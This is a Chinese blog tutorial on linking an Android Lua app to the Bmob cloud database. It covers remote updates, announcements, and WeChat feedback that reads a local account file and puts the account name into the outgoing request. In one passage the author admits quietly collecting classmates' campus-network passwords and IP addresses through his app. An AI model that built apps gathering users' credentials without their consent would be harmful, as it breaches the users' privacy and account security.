---
title: lua对接bmob数据库
tags: lua
date: 2018-07-02 11:09:00
---
## lua对接bmob数据库 ##

![](https://i.loli.net/2018/06/29/5b35cbd14d883.png)

----------

> 学习的最终结果：

 1. 实现用户注册和登录
 2. 数据库增删改查
 3. 远程公告
 4. 远程更新版本
 5. 微信反馈
 6. 甚至自己做一个聊天室服务器，等等。。。
 7. 最后送大家的彩蛋-----超级无敌微信反馈（文末）
 
 


----------

> ## 备注 ##
新手一个，一夜基本学会lua，因为以前玩python 两者很像。很早以前我推送都是用自己的博客，虽然也很方便，总感觉很low，就一直想对接数据库。我做的这个软件是辅助我们大学校园网登陆的，很多同学在用，感觉初学lua的同学没有人会用这类的软件，所以整个包就不放出来了。


----------
## 软件安装包 ##
[https://fir.im/4wgz](https://fir.im/4wgz)
你们不是我学校的核心功能是用不了的，不过可以看看功能。

----------


----------
## 准备 ##

----------

> 准备安卓lua解释器可以使用酷安上的所有lua编程软件，想自己做UI就用基础的软件，不想自己做UI就用FusionApp来做
![](https://i.loli.net/2018/06/29/5b35cd9d331f5.png)
## 开始##


----------

> 注册bmob数据库新建一个应用和数据库
> 我把它起名lua其中一个表为（tuisong）推送

![](https://i.loli.net/2018/06/29/5b35cfffa741a.png)

----------


![](https://i.loli.net/2018/06/29/5b35ceda7b9c8.png)



----------


> 包含以下值
> 	  
on_off   类型Boolean	 ---开启公告标志位
gx_url   类型String	    ---更新软件链接
gx_gg   类型String	    ---更新公告
gg        类型String	    ---公告
bb        类型String      ---版本号


----------

> 下面开始教程
> 首先将bmob.lua放入工程根目录。
> 最好使用我修改和备注过的。

----------


## bmob教程文档 ##

```
b=bmob(id,key)
id 用户id，key 应用key。

b:insert(key,data,callback)
新建数据表，key 表名称，data 数据，callback 回调函数。

b:update(key,id,data,callback)
更新数据表，key 表名称id 数据id，data 数据，callback 回调函数。

b:query(key,data,callback)
查询数据表，key 表名称，data 查询规则，callback 回调函数。

b:increment(key,id,k,v,c)
原子计数，key 表名称，id 数据id，k 数据key，v 计数增加量。

b:delete(key,id,callback)
删除数据，key 表名称,id 数据id，callback 回调函数。

b:sign(user,pass,mail,callback)
注册用户，user 用户名，pass 密码，mail 电子邮箱，callback 回调函数。

b:login(user or mail,pass,callback)
登录用户，user 用户名，pass 密码，mail 电子邮箱，callback 回调函数。

b:upload(path,callback)
上传文件，path 文件路径，callback 回调函数。

b:remove(url,callback)
删除文件，url 文件路径，callback 回调函数。


注：
1，查询规则支持表或者json格式，具体用法参考官方api
2，回调函数的第一个参数为状态码，-1 出错，其他状态码参考http状态码，第二个参数为返回内容。
```

----------

## 远程更新 ##
> 在程序启动时添加更新检测函数：

```
import "bmob"
当前版本 = "2.0"
function 检查更新()
  local b=bmob("你的appid","你的apikey")
  b:query("tuisong",function(code,json)
    if code~=-1 and code>=200 and code<400 then
      --print(dump(json))
      if (json.results[1].bb>当前版本)then
      --判断远程的版本是否大于软件内部的版本，大于则进行更新
        对话框()
        .设置标题("版本更新")
        --显示更新公告
        .设置消息(json.results[1].gx_gg)
        .设置积极按钮("下载更新",function()
        --进入下载链接
          加载网页(json.results[1].gx_url)
        end)
        .设置消极按钮("取消")
        .显示()
      end
    end
  end)
end
```


----------
## 公告 ##

> 在程序启动时添加远程公告函数
> 利用数据查询函数进行查询并弹窗


----------

```
 b:query("tuisong",function(code,json)
    if code~=-1 and code>=200 and code<400 then
      --print(dump(json))
      if(json.results[1].on_off== true) then
      --这里是公告标志位，如果是false则不开启远程公告，如果是true则开启远程公告
        local gg =json.results[1].gg
        --这里就对应了我的网络端数据里面的gg（公告内容）
        对话框()
        .设置标题("数据库远程公告")
        .设置消息(gg)
        .设置积极按钮("确定",function()
          显示消息("点击了确定")
        end)
        .设置消极按钮("取消")
        .显示()
      end
    end
  end)

```


----------
## 其他远程推送功能 ##

> 比如添加一个免责声明的按钮
> 同理也可以做一个关于作者的按钮、等等
> 这都是可以远程控制的
> 利用数据库查询与显示就可以实现远程控制弹窗的内容
> 进入按钮的单击事件

----------

> 效果图

![](https://i.loli.net/2018/07/02/5b399bf9e4f04.png)

----------


> 再添加几个数据点包括about_app（关于软件）  和 mzsm（免责声明） 等

![](https://i.loli.net/2018/07/02/5b399a6711214.png)

----------

```
b:query("tuisong",function(code,json)
  if code~=-1 and code>=200 and code<400 then
    --print(dump(json))
    mzsm = json.results[1].mzsm
    --在数据库里加一个字“mzsm”即可，原理和公告一样
    对话框()
    .设置标题("免责声明")
    .设置消息(mzsm)
    .设置积极按钮("确定",function()
    end)
    .设置消极按钮("取消")
    .显示()
    -- print(type(mzsm))
  end
end)
```


----------

## 注册和登录功能 ##

> 看到这里应该都会用bmob了吧，代码我也注释的很详细。欢迎反馈；
> 下面是我的软件同学在使用过程中，我获取到的他们的账号和密码以及ip地址（并不是盗号，嘻嘻，只是想统计有多少人在用。。。。。。）

----------
![](https://i.loli.net/2018/07/02/5b399d47da435.png)


----------

## 最后的彩蛋-微信反馈 ##

> 这是一位大神做的接口可以直接将消息推送到微信，我之前用单片机做过消息的反馈。使用很简单只需要用get 发送就可以了。几行代码就可以实现。


----------

> 效果如图


----------

>## 软件端 ##
> ![](https://i.loli.net/2018/07/02/5b39a06795aad.png)
>## 微信端 ##
> ![](https://i.loli.net/2018/07/02/5b39a09a75be9.png)


----------
## 使用方法 ##

> 相当的简单，进入网站微信登陆


----------


![](https://i.loli.net/2018/07/02/5b39a1296b9c9.png)

> 然后会生成一个key，点击发送消息来测试一下：如图
> ## 网站端 ##
![](https://i.loli.net/2018/07/02/5b39a178eff28.png)


----------

> 微信端
> ![](https://i.loli.net/2018/07/02/5b39a210dfba5.png)


----------

 - 测试成功，下面应用到lua中。
 - 


----------

```
--输入对话框
InputLayout={
  LinearLayout;
  orientation="vertical";
  Focusable=true,
  FocusableInTouchMode=true,
  {
    TextView;
    id="Prompt",
    textSize="15sp",
    layout_marginTop="10dp";
    layout_marginLeft="3dp",
    layout_width="80%w";
    layout_gravity="center",
    text="BUG提交将推送至我的微信";
  };
  {
    EditText;
    hint="输入反馈";
    layout_marginTop="5dp";
    layout_width="80%w";
    layout_gravity="center",
    id="edit";
  };
};

AlertDialog.Builder(this)
.setTitle("BUG提交")
.setView(loadlayout(InputLayout))
.setPositiveButton("确定",{onClick=function(v) 
    local zh=io.open("/sdcard/校网助手/账户.txt"):read("*a")
    local z=zh:match("(.+)@")
    local m=edit.Text
    local time=os.date("%Y-%m-%d %H:%M:%S")
    local ww="https://sc.ftqq.com/SCU26231T3d328e换成你的5e619d412b2937b0e5af42e7d782a3.send?text="
    local x="主人校网助手有人反馈bug了账号:"
    local g="信息为:"
    local k="&desp="
    local wx=ww..x..z..k..time..g..m
    local sj=math.random(1000,9999)
    local wxs =ww..sj..z..m
    --print(wx)
    Http.get(wx,nil,"utf8",nil,function(code,content,cookie,header)
      if(code==200 and content)then
        print("发送成功，谢谢")
      else
        print("与后台通信异常…尝试第二套方案"..code)
        Http.get(wxs,nil,"utf8",nil,function(code,content,cookie,header)
          if(code==200 and content)then
            print("发送成功，谢谢")
          end
        end)

      end
    end)
  end})
.setNegativeButton("取消",nil)
.show()
import "android.view.View$OnFocusChangeListener"
edit.setOnFocusChangeListener(OnFocusChangeListener{ 
  onFocusChange=function(v,hasFocus)
    if hasFocus then
      Prompt.setTextColor(0xFD009688)
    end
  end})
```
